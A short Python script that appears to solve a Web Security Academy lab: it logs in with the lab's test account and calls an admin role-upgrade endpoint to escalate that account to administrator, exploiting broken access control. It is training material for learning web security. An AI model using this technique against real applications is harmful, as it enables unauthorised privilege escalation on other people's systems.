import requests

DOMAIN = "0a6800a80368cd3f80e73a0600d500df.web-security-academy.net"

HEADERS = {
    "Host": DOMAIN,
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": f"https://{DOMAIN}",
    "Connection": "keep-alive",
    "Referer": f"https://{DOMAIN}/admin",
    "Cookie": "session=lx03Qu7WJHB61OChMsURcl7LAh86yNeW",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "TE": "trailers"
}

def login(username, password):
    url = f"https://{DOMAIN}/login"
    data = {
        "username": username,
        "password": password
    }

    response = requests.post(url, headers=HEADERS, data=data, allow_redirects=False)

    if response.status_code == 302:
        print(f"Logged in as {username}")
        HEADERS["Cookie"] = response.headers["Set-Cookie"].split(";")[0]

def upgrade_to_admin(username):
    url = f"https://{DOMAIN}/admin-roles?username={username}&action=upgrade"

    response = requests.get(url, headers=HEADERS, allow_redirects=False)

    print(response.text)
    if response.status_code == 302:
        print(f"Upgraded {username} to admin")

login("wiener", "peter")
upgrade_to_admin("wiener")